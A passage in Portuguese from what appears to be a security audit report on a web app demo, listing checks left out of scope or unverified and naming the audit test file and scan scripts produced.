- **Fluxo de redefinição de senha ponta a ponta no demo** (não gerei links). Revisão de código e testes existentes.
- **Troca obrigatória de senha no demo**: `EXIBIR_DEMO=true` a desliga. Só Vitest (SEC-03).
- **Limite de tentativas e os avisos de DoS na prática**: força bruta e carga estão fora do escopo permitido.
- **Explorabilidade dos avisos do `next 16.3.6`**: o demo roda 16.4.1. Fica a recomendação de atualizar.
- **Configuração real de produção** (`APP_URL`, `EXIBIR_DEMO`, segredos, Object Storage do Replit): não acessada.
- **Histórico do git**: busquei só os arquivos `.env*` e padrões de chave conhecidos, não uma varredura completa.
- **`trocarPlantaArenaAction` e `salvarProjetoAction` por chamada direta**: a validação vem antes da permissão.
  Cobertos pelo teste de service (`permissoes-matriz.test.ts`).
- Actions chamadas só com ids inexistentes (sem alvo real de outra área): a ordem "permissão antes de buscar" ficou
  confirmada pela mensagem. Alvo real de outra área só foi usado nas solicitações (SOL-0029) e na arena.

## Arquivos

- Teste que comprova os achados: `src/server/seguranca.auditoria.test.ts` (novo; nenhum teste existente foi editado).
- Scripts da varredura (fora do repositório, descartáveis): `C:\Users\yan.araujo\AppData\Local\Temp\secrev\`
  (`lib.mjs`, `matriz.mjs`, `acoes.mjs`, `acoes2.mjs`, `carga.mjs`, `arena.mjs`, `vazamento.mjs`, `csrf.mjs`).
  Os resultados brutos estão em `matriz.json` e `acoes.log`.
